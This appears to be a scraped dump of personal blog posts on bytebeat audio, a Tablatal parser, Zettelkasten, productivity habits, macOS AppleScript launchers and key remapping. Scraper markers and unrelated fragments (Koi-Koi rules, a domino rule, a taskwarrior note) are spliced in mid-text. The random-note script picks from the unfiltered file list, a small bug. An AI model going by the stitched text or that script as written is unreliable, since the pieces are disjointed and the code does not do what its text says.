Rogue Amoeba’s Loopback to record your system audio. THis is very simple and highly recommend it.\n\nIf for whatever reason that doesn’t work for you, you can create a raw audio file on your computer and use Audacity to open it. This may not output exactly what you heard when playing it using the bash script, but it may yield some cool variations.\n\n\n  Run your script to create the compiled Bytebeat script (give it a proper name instead of test if that’s easier to find). Within your folder, you should find a file of that name.\n  Send the output of this newly compiled script to a file instead of piped to SoX. (NOTE: This can create endlessly large files on your computer and possibly eat up all empty memory if you don’t stop it quickly. To avoid this, cancel (ctrl + C) the process around a half-second to a second after you start it.) To do this, write this in your shell, assuming your newly compiled file is called test and the output file is called output.raw: ./test > output.raw\n  As said before, you will want to cancel this process very quickly after you start it with ctrl + C, as it can otherwise create a massive file.\n  Open Audacity. Select File > Import > Raw Data... and choose your newly output file (output.raw in our example). Use the following settings in the dialog box:\n    \n      Encoding: Unsigned 8-bit PCM\n      Byte Order: No endianness\n      Channels: 1 (Mono)\n      Start Offset: 0\n      Amount to Import: 100\n      Sample Rate: 8000\n    \n  \n  Listen to your hideous creation.\n\n\nOther Resources/Implementations\n\n\n  C and Python: http://royal-paw.com/2012/01/bytebeats-in-c-and-python-generative-symphonies-from-extremely-small-programs/\n  Python: https://gist.github.com/bzamecnik/a2d45dc0addb8d602d70b1d8df0f9fd0\n\n\n\n'] at ['http://milofultz.com/2020/11/10/bytebeat']

Try not to choose the\n“parent” in any other way, as this is the\nauthentic way of choosing the dealer in\nKoi-Koi\n\nPlaying the Game\n\nThe dealer will deal two cards at a time in\norder of the player, field, and dealer. Deal\neight cards face down for each player, and\neight cards face up in the field in-between.\nPlace the remaining deck of cards to the\nside of the field face down\n\nAfter the players look at their cards, the\ngame will begin with the first player (the\ndealer) taking one card from their hand\nand placing it face up on the field. If the\ncard matches the month of any of the\ncards on the field, the dealer takes the pair.\nIf there are no matching cards on the field,\nthat card will remain on the field face up.\nThe player will then pick a card from the\ntop of the remaining deck, and again if\nthere is a card of a matching month on the\nfield, the two cards will become a matching\npair. If not, the card will be placed on the\nfield face up. The player takes the\nmatching pairs, if they have any. and\nplaces them face up in front of them,\nending their turn.\n\nContinue to take turns playing until one of\nthe players comes up with a set. Tally the\npoints scored for that set, and continue\nplaying with a new game, with the winner\nbecoming the dealer. If either player is\nunable to make a set and their cards run\nout, the game is a draw and the other player\nbecomes the dealer in the next game.\n\nThe Koi-Koi\n\nAfter you make a set you can either end the\ngame there and earn the points for that one\nset, or if you think you can get another, you\ncan call “Koi-Koi!” and keep playing to get\nanother set. Be careful though, because if\nyour opponent makes a set after you call\nKoi-Koi before you make your second set,\nthe other player will double their points, and\nthe game will end. Koi-Koi can only be\ncalled once per game.\n\nMultipliers\n\nIf your sets total 7 or more points in a single\ngame, you earn a multiplier and get double\npoints! This is where you can win big, so\nrack those points up!\n\nLucky Hands\n\nIf the sets below are already made in your\nhand when the cards are first handed out,\nthat player wins these points and the next\ngame will begin.\n\nFour Hands\n\nWhen there are four cards of the same\nmonth: 6pts\n\nSticky\n\nWhen there are four sets of two cards\nfram the same month: 6pts\n\nSpecial Card\n\nThe Chrysanthemum and Sake Cup card can be used\nas a 10 or a 1 point card.\n\nThe Sets\n\nObtaining one of these sets will earn you points and give you\nthe opportunity to claim victory, or call “Koi-Koi!”\n\n\n  Kasu (Plains) - 10 Plain cards. 1 point.

Found CONTENT ['Check out the up-to-date version on GitHub\n\nI’m rethinking my Track and Tod apps for tracking my tasks, mood, and other\ndata after checking out Josh Avanier’s Log,\nV’s Log, \nDevine Lu Linvega’s Horaire and\nothers. I am determined to keep my log plaintext and was not\nsatisfied with options like CSV or TSV, as they look terrible when reading\nin a plain text editor. I eventually found \nDevine’s Tablatal and am looking\nforward to using it with my system.\n\nFrom Devine’s site: “In the Tablatal file, the first line declares the key, the\nspacing between each key defines the length of the parameters for all\nsubsequent lines.” It is a much more aesthetically pleasing plaintext data\nformat, though the tradeoff is malleability, as you must define how large\nthe field sizes are before getting going (I’ll solve this with some kind of\nutility if it ever comes up as a problem).\n\nThere is both a to- and from-Tablatal utility. Both use a list of dicts as\ntheir starting point, but can also be used directly in the CLI to interface\nwith JSON files.\n\nSyntax\n\n\n  Comments are preceded by a semicolon.\n  The header line is expected to be all caps and may be preceded by a\nsemicolon as if a comment. The spacing of this header line sets the spacing\nfor all content that follows.\n  The content is everything that follows the header line. Empty fields\ndefault to None.\n\n\nExamples can be found \nhere at neauoire’s page.\n\nUsage\n\nAs a CLI, the parser takes in a plaintext Tablatal file (tbtl) and\nreturns a JSON file. There is one optional argument --headers, which\nyou can supply a set of custom headers separated by commas for the parser\nto use when outputting. For instance, if the beginning of your file\nincluding your headers looks like this:\n\n; The horaire is a collection of logs.\n; https://wiki.xxiivv.com/site/tablatal.html\n;     CODE HOST                 PIC NAME\n;     7    12                   33  37\n20X09 +300 talk                     Talk at Speakers Series, SNSYC\n20X07 +300 talk                     Grundlagen der digitalen Kommunikation\n20V08 -332 orca\n...\n\n\nThe header line is started by a semicolon, which would obfuscate the parser\nfrom giving it a useful name. This can be remedied via the CLI:\n\npython3 tbtl_parse.py input.tbtl output.json --headers "DATE, CODE, HOST, PIC,\n NAME"\n\nThe JSON-to-Tablatal parser needs a little user input to determine the\n order of the fields, but otherwise operates the same as the other utility.\n\n\n'] at ['http://milofultz.com/2020/10/31/tablatal-parser']

Usually it’s a lot of “should”ing about random things in my life that in hindsight is not that big of a deal. Or it’s stuff that makes a real difference but is really hard[1], which means a lot more work.\n\nBut one thing has amazingly made it through this filter in the background, being both successful and impactful in my life: the Two-Minute Rule from Getting Things Done.\n\nIt’s simple and has been tossed around in a zillion different books by a billion different people under just as many names (thirty-second rule, five-minute rule). Essentially, if it takes less that two minutes to do, do it now. It’s so easy and honestly is such a small time investment, it somehow just happened for me. And even better, when something does fall through the cracks even though I know it will only take a couple of minutes, this now means something. It means that this task or to-do has some emotional weight that I need to deal with, and at least I’ve made it easier to see this and now actionable.\n\nThe thing that I like most about this is that it’s not about ““getting things done” (particularly for the sake of getting things done, which is the worst), it’s about closing open loops. I realized I ran around all day seeing these open loops and it weighted me down: a dirty dish, unopened mail, a difficult email, etc. Using this rule helps with the toughest part of completing these difficult tasks: starting.\n\n\nReferences:\n\n\n  https://tjcx.me/posts/defense-self-help/\n\n\n\n'] at ['http://milofultz.com/2020/10/04/two-minute-rule']

Found CONTENT ['During quarantine, I’ve been trying to just be bored and not constantly DO things and it’s weird how hard that is. Blah blah, every complaint about technology bad. But that aside, I do like techology and love spending time with it. And trying to reconcile these two things in particular has been difficult.\n\nTech has had a weird hold on me since I was a kid, and it has been what I have always wanted to spend my time doing. But I felt like I was also getting signals from various places that technology was bad and I shouldn’t spend so much time on it, probably a recoil from video games and the like.\n\nSo now looking back, I think my reticence was due to a conflict between my love of tech and the avoidance of doing “the bad thing”, in this case, “waste my life” on computers, etc. Realizing this recently has led to a feverish pursuit of so many things I have pursued but guiltily so for years: programming, video games, and electronics in general.\n\nDuring these COVID times, I couldn’t have really asked for a better hobby than sitting on a computer and creating things alone in a room. However, these times of reclusivity also create this problem where I find I can’t let it go and I have to keep working because I “should” or “else” “something” might happen.\n\nSo now I am on a quest to try and be bored more. Like not do anything for as long as possible until I feel an urge to do it or a really strong desire, and not just a tiny pinprick of discomfort. At this point, I am completely out of practice, but I’m excited to see how this develops and if this space leaves me a bit more relaxed and mindful.\n\n\n'] at ['http://milofultz.com/2020/10/04/doing']

If the opponent’s domino defense value is lower than the attack, the domino is killed. If the opponent’s domino defense value is equal to or higher, then they have survived.

Found CONTENT ['For the last few months, I have been feeding my Zettelkasten with essentially anything that I find interesting: programming, emotional development, quotes, productivity, book or video reviews, whatever. If I think it’s something that will help me or make me excited later, I put it in there.\n\nThe problem I had was that even though I had these notes for reference, I wasn’t finding myself reviewing them just for creating those interesting and random connections, which was something that I had initially started using the Zettelkasten for. Those random connections are what creates interesting ideas and diffuse connections, as well as a spaced repetition for ideas that I already decided are worth knowing.\n\nI found a solution that was implemented by productivity dude and Twitter instigator Tiago Forte. Essentially, his “second brain”, analogous to a Zettelkasten, is housed in Evernote, and he had an app developed that would pop open a random Evernote every time he clicked it. He found that this boosted his creativity and because of how easy it was, he was able to do it between meetings, during his breaks, essentially in any spare moment. In doing some research, I found somebody who made a random note Applescript for the Evernote app that looks like this:\n\n# Applescript\ntell application "Evernote"\n\tset noteList to find notes\n\tset randomNote to some item of noteList\n\tset query string of window 1 to (title of randomNote as string)\nend tell\n\n\nI figured it was just as simple of a task if you had your notes saved locally, which I do as text/Markdown files, so I set out to make a Python script that did this, along with an app implementation that can sit in my dock. I used the same process I did in my “Make Python ‘Apps’ and Shortcuts To Run Them on OSX” post, so obviously this is geared towards OSX users.\n\n\n\n\n  Create your Python script, replacing the paths and extension to yours:\n\n\nimport os\nimport random\n\nfolder = "/path/to/notes"\nprog = "/path/to/application.app"\next = "txt"\n\nfile_list = os.listdir(folder)\ntxt_list = [file for file in file_list if file.endswith(ext)]\nrandom_file = random.choice(file_list)\nrandom_fp = os.path.join(folder, random_file)\nos.system(\'open "{}" -a "{}"\'.format(random_fp, prog))\n\n\n\n  Save this file and name it whatever you like .py, like random_note.py. (I saved it where all my code projects are, but you could also create a folder in your Applications folder and stick it there)\n  Open Script Editor and make a new document. Ensure that AppleScript is selected in the dropdown menu in the upper left of the window.\n  Create your Applescript, replacing the paths and script name to yours:\n\n\ndo shell script "cd \'/path/to/script\'; python script_name.py"\n\n\n  Save the script in your Applications folder as an “Application” file format.\n  Put it on your dock and go wild.\n\n\nI added a little light bulb icon on mine[6], as is tradition, and it is a great way to pass the time. I spent all this time curating ideas, recipes, thoughts, information, and experiences I thought were interesting, and now I can really enjoy the payoff in a very fun way.\n\n\nReferences:\n\n\n  \n  RandomNote app from Tiago Forte\n  RandomNote Web\n  random note Applescript for the Evernote app\n  Make Python ‘Apps’ and Shortcuts To Run Them on OSX\n  Add icon\n\n'] at ['http://milofultz.com/2020/08/26/random-note']

Found CONTENT ['After experimenting with PyInstaller and Platypus to create a standalone app in OSX with no success, I went the much lower fidelity route. But it was successful, so I’m happy with it. YOu can see the script I made here.\n\nThe goal of this was first to make a standalone app that will run Python script, but second to assign it to a keystroke. I have only tested this with running a Python script, but I can’t imagine it would be much more difficult for any other bash script. So here is the process:\n\n\n  Open Script Editor (in Applications/Utilities).\n  \n    Using the do shell script command, add the script you want to run. Essentially, you’ll want to write in what you normally put into the Terminal, separated by semicolons.\n\n    do shell script "cd \'path/to/script\'; source venv/bin/activate; python main.py"\n  \n  Save this as an Application to your Applications folder (or wherever makes sense).\n  Close Script Editor. (If you don’t want to add a shortcut, you can stop here)\n  Open Automator (in Applications).\n  Create a “Quick Action” or “Service”, whatever one your OS says.\n  In the top bar, set the following setting: Workflow receives current no input in any application.\n  In the column second from the left, drag the “Launch Application” task into the “Drag actions or files here” area.\n  Select your application within that dropdown menu.\n  Save this with a memorable name.\n  Close Automator.\n  Open System Preferences and go to “Keyboard”.\n  Within this window, click “Shortcuts”.\n  Click on the “Services” menu on the left hand side.\n  Scroll to the bottom of the right window until you see your new service you created.\n  Double-click where it says ‘none’ and set a new shortcut (make sure it’s unique and won’t conflict with other programs or special characters. I chose ctrl+opt+shift+A). \nNOTE: If you don’t do the following steps, your shortcut will not work.\n  Close your System Preferences.\n  Click on Finder in your dock.\n  Open the Finder dropdown menu and go into Services. Click on your new service to run it manually.\n\n\n\n\nReferences:\n\n\n  https://www.makeuseof.com/tag/applescript-bash-scripts-apps/\n  https://discussions.apple.com/thread/5048120\n\n'] at ['http://milofultz.com/2020/07/22/make-python-apps']

The longer you take to implement your concepts, the better.\n\nBig Overview:\n\n\n  Understanding the Problem\n  Breaking It Down\n  Inspection\n  Development/Testing\n\n\n\n\nUnderstanding the Problem\n\n\n  \n    Describe what the problem is in abstract terms as clearly as you can. What is the thing that you can’t do or isn’t happening right now?\n  \n  \n    Describe the solution to this problem in abstract terms as the desired result. Don’t worry about the how yet, just what the result will be.\n  \n  \n    Describe in abstract terms what things the program will do, as if it was a person doing it, not a computer. What are all of the smaller tasks within this bigger problem/solution?\n  \n  \n    From there, describe how your program will handle data on the way in and the way out (not within the program). What do you as the user want to give it and what do you want it to spit back out? Like when you give the dry cleaner your clothes: input is dirty clothes, output is clean clothes.\n  \n\n\nBreaking It Down\n\n\n  \n    Break down the process further in abstract terms. What are the distinct actions the program will need to take to solve this problem? If you were asking a very pedantic person to do this task for you, what would you tell them?\n  \n  \n    What are the biggest distinct functions you can perceive in the description you just created?\n  \n  \n    Can you break these down further into sub-tasks? If so, go back to breaking it down (5.) in abstract terms until you can’t do it anymore.\n  \n  \n    With the many discrete functions you have, what data types would be best to give to and get from them?\n  \n  \n    Make a very rough outline of each function in your program using information from chunking steps. Include only necessary in/out information (e.g. if you are wanting to eat and the data type is ‘food’ and it will return ‘poop’: def eat(food): return poop)\n  \n  \n    Within these functions, write out an overview for each function. Write again for this ultra pedantic person.\n  \n  \n    See if you can break down elements of the functions into even smaller parts. The more that functions can be used and reused all around the whole program, the better.\n  \n\n\nInspection\n\n\n  \n    Once the program has been broken down into its most atomistic functions, start writing pseudocode into them to have an idea of what you’re going to do.\n  \n  \n    Look again for similarities in between functions and see if there is any process the functions could share. If so, then take that and break it down into it’s own function.\n  \n  \n    When you feel it has been fully broken down and the flow of data makes sense, create a basic outline of how the different functions will flow together from beginning to the end of the program. Do the data types match? If not, can you use a different data type? Is an adaptation needed between one function and another?\n  \n\n\nDevelopment/Testing\n\n\n  \n    Make a basic way to develop each function and test it as it goes (in Python, by adding an if __name__ == \'__main__\': section).\n  \n  \n    Figure out what is the easiest thing to program and test. Go with the pseudocode you’ve written and start fleshing it out with real functionality. Test each part as you go in the terminal.\n  \n  \n    Repeat this process with each element of your code, ensuring that it works exactly as you expect. You don’t have to go in a linear fashion, if it is easier or more sensible to jump around.\n  \n  \n    Don’t be afraid to go back to previous steps if you realize further possibilities of chunking or other revisions.\n  \n\n'] at ['http://milofultz.com/2020/07/18/programming-outline']

I found this on Hundred Rabbit’s Youtube channel and thought it looked like a fun game for solo play that made solitaire a lot more interesting. The rules are a bit confusing so be sure to watch the video and see them play it through.\n  Canfield - When I was on a cruise ship for a week for a gig, I literally played this game for probably upwards of 7 hours and I think I won once. For some reason, I keep coming back to it.\n  Alpha Blitz - Not really a “game” but a good way to pass time. Find a word and then figure out the longest anagram you can using only those letters (lens = senselessness).\n  Hanafuda (solitaire) v1 & v2 - Super satisfying as a human who loves pattern matching. Very helpful in developing knowledge of the cards and their suits, as having grown up with more easy to organize designs, it takes some getting used it. The deck of cards cost me $1.50 at a Daiso.\n\n\n2+ Player\n\n\n  Word Mastermind/Jotto - I played this a ton with a friend of mine in our down time in college. Super easy to play and you don’t really need anything except a paper and pencil, unless you have a good memory. It’s pretty much just the game mastermind but with words instead. I made a Python version of this, which you can find here.\n  Paper Football - Aside from the obvious of kicking it, the tabletop play of this game is so fun and makes waiting in a place with a floor or table much more fun. All you need is some scrap paper and a surface.\n  Exquisite Corpse - Total absurdity and chaos through drawing. Only need a pen and paper and will create a wide range of stuff, from silly pictures to nightmare fuel.\n  Monkey Tree (video) - This is almost a workout more than it’s a game, but nonetheless a fun way to spend time. One person stands arms out to their sides with legs wide, stable on the ground. The other person climbs on their back and finds ways to maneuver around them. Tougher than it seems, both physically and for your friendship.\n  Domine (video) - Another one from Hundred Rabbits. All you need is a double 9 domino set.

Found CONTENT ['Quality is an attribute you give to help label something. Quantity is a measurement you use to help label something.\n\nQuality requires quantity for it to exist. One can’t measure how hard something is without two things to compare them to. Quantity requires quality for it to exist. One can’t measure something with which it has no label.\n\nTo attribute a quality to something, it must be fully defined. One cannot attribute a quality to something without fully knowing what it is. In turn, one cannot measure something that has not been fully defined. What is 0 or 100 if one cannot define them?\n\n\n\nThis struck me as I was watching a video[1] and ended up with a discussion with a roommate about this relates to critical feeling. As defined by Bret Weinstein[3], critical feeling is making sure that you don’t get caught up in other people’s feelings. One can use quality and quantity to more honestly trust your critical feeling in this way:\n\nWhen one is presented with a quality or label, either from another person or from within themselves, one must seek to define the quality as fully and completely as possible. For instance, if one is accused of being “lazy”, one must define it, and preferably with whoever is making the accusation in mind. Once this quality is defined, one can then measure if they indeed hold this attribute, how much, and the impact this quality is having upon those affected, which could be themselves, their community, their family, or whatever. Once one has this information, one can truly understand the circumstances and be critical of the quality and it’s truthfulness in it’s application.\n\nIf one cannot define the quality that is being attributed, they have no business attributing it. And if once defined, one cannot measure the impact the attribute has, then it is not important.\n\nI believe this exercise has the potential to avoid claims of essentialism[4] (all humans are bad/good, all X people are Y), to help ground accusations or problems in the realm of the logical and the real, and to present us with further action, instead of letting our brain buck or accept a quality that may or may not be useful or important.\n\n\nReferences:\n\n\n  https://youtu.be/eOfVBqGPwi0?t=886\n  Critical Feeling\n  https://www.youtube.com/watch?v=PfAumoTIeik\n  https://en.wikipedia.org/wiki/Essentialism\n\n'] at ['http://milofultz.com/2020/06/21/quantity-quality']

Found CONTENT ['\n  Critical feeling is making sure that you don’t get caught up in other people’s feelings.[1]\n\n\nI like this idea a lot because it clarifies a problem that I have often had. My emotional conviction on my values and ethics have often been weak, untethered on clear principled thought, and thus I have been more susceptible to bandwagoning based on big emotions. There have been many times where I later found that my actions or thoughts were not honest to what I actually desired in the situation or believed and this I think was due to a lack of critical feeling.\n\nWhen it comes to critically thinking, the analysis of facts to form a judgment[2], I tend to be more skeptical in the points or ideas of others. I usually disagree with people until I run through the scenario sufficiently and fully understand and agree with what is being presented. Emotions tend to override this skepticism and sweep me up in the romantic nature of whatever is at hand. This I believe is due to a relatively weak understanding of my own emotions and what they are trying to communicate to me, as well as a lack of practice in working with them.\n\nThe new question is how to practice and develop critical feeling. (Update 20200622: I developed a method that you can find here). As for critical thinking, according to this article in the HBR[3], there are three things that can help you: question assumptions, reason through logic, and diversify thought. I believe these are the same, and for people like me who have had problems with their emotional development, this can include some really difficult practice, alone or with a guide (therapist, friend, family, etc.).\n\nIn the last few months, I have been going to therapy weekly, devouring YouTube videos about philosophy[4][5][6], and talking a lot with my friends and family about more emotionally complex things, and I have noticed a much larger capacity to understand what is happening with my emotional state, and therefore maintain what I feel while also being able to empathize better with others.\n\n\nReferences:\n\n\n  https://www.youtube.com/watch?v=PfAumoTIeik\n  https://en.wikipedia.org/wiki/Critical_thinking\n  https://hbr.org/2019/05/3-simple-habits-to-improve-your-critical-thinking\n  https://www.youtube.com/user/thephilosophytube/videos\n  https://www.youtube.com/user/ContraPoints\n  https://www.youtube.com/user/alexjoconnor\n  Quality and quantity’s relevance to critical feeling\n\n'] at ['http://milofultz.com/2020/06/10/critical-feeling']

Found CONTENT ['A couple of weeks ago, I worked on starting my Zettelkasten and just to try it out and see how it worked, I started with exercise. Using it and a few resources, I was able to come up with a list of various strength, mobility, and flexibility exercises that target various areas and a very basic framework with which to apply them. I won’t be posting all the exercises here, but I will show the system, my focus areas, and my general guidelines it is based on.\n\nMy dream is to be able to do this anywhere and at anytime.\n\nMy motivation to exercise is certainly not to get ripped or super swole. As anybody who knows me could probably guess, that’s a bit out of reach, as I am a tiny stick with the metabolism of a squirrel. So knowing that, I wanted my system to take the least amount of time and have the least amount of gear to haul around (preferably zero). I also knew after having purchased and selling gear multiple times that having exercise gear doesn’t really inspire me to exercise, anyway, so I aimed mostly for bodyweight exercises for this reason.\n\nAfter doing a cursory amount of research, I aimed to focus on these different areas[1] in the main part of my workout:\n\n\n  Upper Body\n  Lower Body\n  Core\n  Cardio\n\n\nThe other category mentioned was flexibility, which I decided to use as a bookend for my workout.\n\nAfter digging around and settling on a bunch of options for exercises in each of these categories, I am using a high intensity interval training framework described in this blog post[2], “using full-body exercises, while training in a shorter amount of time and doing a circuit”.\n\n\n  Dynamic stretching[3] of whole body, top to bottom[4]\n  Circuit using one exercise from each of the four categories above in timed increments in any order\n  Repeat step 2 with a short break until you feel well exercised\n  Flexibility exercises of joints[5][6] and static stretching of whole body, top to bottom\n\n\nUsing bodyweight exercises, this can essentially be done in tiny space with nothing, which is really useful for getting me to do it instead of making excuses.\n\nExamples\n\nThese are some examples of circuits I have been using. One of these circuits per session, 4x through the circuit with 30s on each exercise and 10s rest in between each:\n\nCircuit 1\n\n  Pushups\n  Squats\n  Situps\n  Shoulder to Foot Taps\n\n\nCircuit 2\n\n  Superman\n  Lunges\n  Mountain Climbers\n  Jumping Jacks\n\n\nCircuit 3\n\n  Pullup Superman\n  Lunges\n  Bicycle Crunches\n  Jumping Jacks\n\n\nHIITimer\n\nI made a super basic program that utilizes the native TTS on your computer to help time your exercise routine and loads exercise presets from plaintext files you can create and edit.

If you know where or from whom this originated, please tell me!\n\nThe idea of this is to have a day planner where the axis around which you plan is not time, but location. Instead of thinking about what you are going to do between 9am and 10am, this has you think about what you can do in a given space.\n\n\n\nThe thing I like best about this is that it is really good for keeping you in touch with activities you enjoy and places you like, making it easy to do those things by choosing it off of a menu. It’s almost like a worksheet for the day, with the bottom of the page open for note taking, drawing, and scribbling ideas down. Appointments and other real-life things aside, this is a lateral-thinking way to encourage you into desired activities.\n'] at ['http://milofultz.com/2020/05/23/day-planner']

Found CONTENT ['I’m probably going to do a hack job explaining this, so TL;DR: Zettelkasten makes all of your notes easier to develop, utilize, and organize for whatever you need them.\n\nZettelkasten is a way of note taking and cataloguing that was popularized by sociologist Niklas Luhmann. This particular system intrigued me because it seems to overcome the issues that some basic note taking strategies have.\n\nNote taking, in the way I was taught, is all about writing down what you’re thinking in a stream-of-consiousness, extremely linear way. This can be good for going through a whole thought process and getting it all down, but it’s lacking any ability to be anything but “start here and end up there”. It’s hard to link it to any other ideas without explicitly remembering what your thought process was. It is possible, with use of notes in the margins, post it notes, and maybe a synopsis (which is also a written out linear thought), but is very unwieldy and again relies on your remembering or regularly reviewing your documented info. Kind of defeats the purpose of documentation.\n\nThe other way is to use a kind of mind map. Starting with a basic idea or concept, one branches out into all related things. Maybe “Food” branches off into “Bread”, “Vegetables”, “Nuts”, “Seeds”, and “Fruits”. Maybe “Bread” then branches off into “Focaccia”, “Yeast”, “Sourdough”, “Rolls”, “Pizza”, etc. This can go along for a LONG time, leading people into a more creative exploratory area, kind of allowing their brain to just utilize that free association. The problem that can occur here is again a lack of mobility. Under “Bread”, maybe you want to create some kind of grouping by if it is a yeasted bread, or if it is enriched. Maybe you want to expound on the greatness of sourdough crust on a pizza, where would you put it: under “Pizza” or “Sourdough”? How would you go about organizing these already existing elements in the map without having duplicates or just wasting time moving things around?\n\nI believe that the Zettelkasten can help solve this issue. This allowed Luhmann the luxury of seeing this larger mapping of ideas and freedom of association that the mindmap provides, along with the linearity of thought that the more “academic” linear note taking technique provides, but without their rigid limitations.\n\nIn my short time playing with this note taking concept, I have used it to take notes on a book I’m reading and help develop some of the major points I’ve seen into things that are relevant to me. I’m able to cross reference from different notes, allowing core concepts to stand on their own and also lead me down expository rabbit holes, allowing a development of smaller ideas that can create new connections once more.\n\nThe way I see it, the longer I keep my Zettelkasten, the more robust my index of information, the more connections I can make, the better I can understand and develop my ideas.\n\nBecause you’re probably wondering what it actually is and not just my real glossy surface level explanation of it, I recommend reading more in depth on it in these two articles:\n\n\n  The Zettelkasten Method\n  Zettelkasten — How One German Scholar Was So Freakishly Productive\n\n'] at ['http://milofultz.com/2020/05/22/zettelkasten']

Found CONTENT ['I downloaded Reality Adlib Tracker and MilkyTracker the other day and realized that Apple removed their insert key abilities a LONG time ago. The insert key is used quite a bit in these older programs for basic things like adding a line in your tracker, creating your pattern sequence, etc. Along with things like Dosbox, where these old relics are utilized, most of these older programs don’t allow new keybindings, so I had to dig around and find a new solution. I unfortunately couldn’t find anything directly related to trackers and stuff on any of their forums, so I figured I’d try and make something that could be found when searching for trackers, DOS, etc.\n\nHere’s one very simple and one not very simple but extremely interesting (read: difficult to understand for a rube like me) solution.\n\n\n\nSIMPLE And Recommended:\n\nKarabiner-Elements is an open-source program that allows you to remap any key on any device to another key. In this instance, I remapped my right alt/option key to the insert key, as I do not use that option key almost ever. In Karabiner, it’s honestly so simple, as you can see in the screenshot. Choose what key you want to press and what you want it to output. I tested this in RAD and it works beautifully.\n\nCheck out a picture of my settings here.\n\n\n\nNOT AS SIMPLE And Honestly Not Recommended:\n\nSo this way is much more in depth and I honestly don’t really know a lot of what I am doing here. What I tested works for me, but of course YMMV.\n\nI utilized the ideas listed in nanoant’s article, “macOS function key remapping with hidutil”, as well as the USB HID usage table and made a couple lines of code that can be input to achieve the same effect as above.\n\nCheck out a picture of my settings here.\n\nGo into terminal and type the following:\n\nhidutil property --set \'{"UserKeyMapping":[\n{"HIDKeyboardModifierMappingSrc":0x7000000e6, "HIDKeyboardModifierMappingDst":0x700000049}]}\'\n\n\nWhat this does is the hidutil (Human Interface Design utility) is setting a new key map in the following way: key “right alt” is going to now output key “insert”. At this point, it wasn’t working, so I figured I needed to do the opposite, setting the “insert” key to map to “right alt”.\n\nhidutil property --set \'{"UserKeyMapping":[\n{"HIDKeyboardModifierMappingSrc":0x700000049, "HIDKeyboardModifierMappingDst":0x7000000e6}]}\'\n\nThis made it work for me, and I don’t fully understand, but it is interesting to note. There are a lot of interesting controls in the USB HID image table, so I wonder if I would need any of these strange controls in the future. At least I’ll know how to map them … maybe?\n\n\n  20201001: Used to make caps lock key the escape key for use with Vim\n\n'] at ['http://milofultz.com/2020/05/22/keyboard-remapping']

Found CONTENT ['In wondering if I should make a purchase, I noticed a problem with my thinking early on: if something was on sale, I’d buy it, just in case I needed it later to accomplish some goal or in a project I had in mind. The reasoning was that if I bought it now, in a year when I need that very specific thing on that project, then I won’t have to pay what feels like an extra amount, as well as extra time, to go and buy it.\n\nThere were a lot of problems with this line of thinking, mostly that the allure of a sale deluded me into thinking that I will use the thing, making me think about all the things I may need this thing for and justifying it that way. But what finally broke this down for me was thinking about the real estate these things take up and how it affects me.\n\n\n\nDoes buying a thing just in case I need it in the future outweigh the costs? Putting extreme situations aside, I pretty much always feel the answer is no.\n\n\n  The cost of space. Even with smaller things, there is a cost to house these just-in-case items, especially the more you get. Storage isn’t free, and there is a very real cost to keeping your things organized and maintained.\n  The cost of finding it when you need it. This problem grows worse and worse the more just-in-case stuff you get. If you have a house full of stuff you might use, you have two choices: spend your time organizing and maintaining that organization, or save that time and then spend that time later trying to find it. Either way, your total time spent goes up with each just-in-case item you buy, and if you feel that your time is worth anything, the time spent in trying to find it later will most likely negate any savings you may have gotten.\n  The mental cost. With items that are tied to half-done or barely started projects, there is a mental cost to seeing these just-in-case items around the house. When I walked by my oak 1x8’s in the garage, I was reminded that I bought those to build a skateboard and I haven’t done anything with them for two years. For me, being reminded of all of that whenever I walked in the garage gave me a sense of disappointment instead of excitement. If I had scheduled time to finish that project before I bought the supplies, I would have closed the loop, finished the project, and not brought down my mood over those years.\n  The cost of never using it. If you never end up using it, it is a total loss. I can’t tell you how many times I have bought something just in case, just to try and sell it and then give it to a thrift store 4 years later when I finally gave up the ghost. In these situations, I lost 4 years of space, 4 years of organizing and maintaining it, and the full cost of the item. If I do this with one item out of ten, will that make the other nine worth it?\n\n\n\n\nThere are still situations where buying something just in case is actually useful, but I find that is few and far between. At this point, I have much more usable space than I did before, a lot less half-done or barely started projects, and more money.\n\nOverall, if I had to choose one side, I would choose real estate over buying things “just in case”.\n'] at ['http://milofultz.com/2020/05/22/just-in-case']

Found CONTENT ['Adam Savage agreed with the following advice regarding buying tools:\n\n\n  When you’re first starting a hobby, don’t buy the expensive tools. Buy something mid-range. If you use it so much that it breaks, then buy the best one to replace it.[1]\n\n\nFollowing with:\n\n\n  Once I was working professionally my goal was to steadily accumulate better versions of my high-use tools. And if there was a tool I didn’t have but NEEDED more than 3x/year I’d invest in that tool.[1]\n\n\nIf you are unsure how often you will use this tool or it’s efficacy in achieving your goal, you may buy cheap first on purpose. This goes against the prevailing advice of “pennywise and pound foolish” and “buy cheap, buy twice”, but in the long-term, this advice may save money and give you valuable data you didn’t have before.\n\nIf you are considering getting a tool, you may be able to bypass most criteria aside from “Effectiveness” with this method. Simply look for the one that is cheapest and will get the job done well. It doesn’t have to be perfect or do everything, but it needs to do the job. In buying cheap here, you are ending up giving yourself a way to accrue data:\n\n\n  Do I actually need this tool?\n  Will I use this tool very often?\n  Is this tool effective?\n  Does this tool do everything I need it to?\n  Do I need it to do more than it does now?\n  What are the elements I wish were improved?\n\n\nThese insights are things you may not have known to think about prior to owning this “inferior” tool, and now for a minimal investment and real world experience, you can make a better informed purchase in the future.\n\n\nReferences:\n\n\n  https://twitter.com/donttrythis/status/941149124497305600\n\n'] at ['http://milofultz.com/2020/05/17/adam-savage']

I followed part 1 and part 2 directly, but skipped tickling and context switching described in the two following parts. I keep t very simple for now, although I acknowledge the power that setting up those missing parts could have for me.\nHaving those command aliases is pretty handy and could easily be underrated in my opinion.\nIn addition, I added a handy way to handle articles I stumble upon and want to read later, or some tutorials, or whatever website I want to examine, but just not now, that fits within this process.\nIn my browser I added a usercript that can add tasks to taskwarrior for me, and gave those websites an extra tag. The binding looks like this:\n\n:spawn --userscript taskadd +www\n\nThis adds tasks annotated with the www tag, for which I added a report that looks similar to the ones described in part 2 above:\n\nreport.www.columns     = id,project,tags,description\nreport.www.description = Website bookmarks\nreport.www.filter      = status:pending limit:page (+www)\nreport.www.labels      = id,pro,tags,description\n\nSo whenever I find an article that I think is worth setting time aside for, I hit the keys to add the task, and when I have the calm and time to read an article, I just enter t www and pick one from the list.\nI also do synchronise my tasks—mostly for backup at the moment—but this would also enable me to access them from multiple devices.

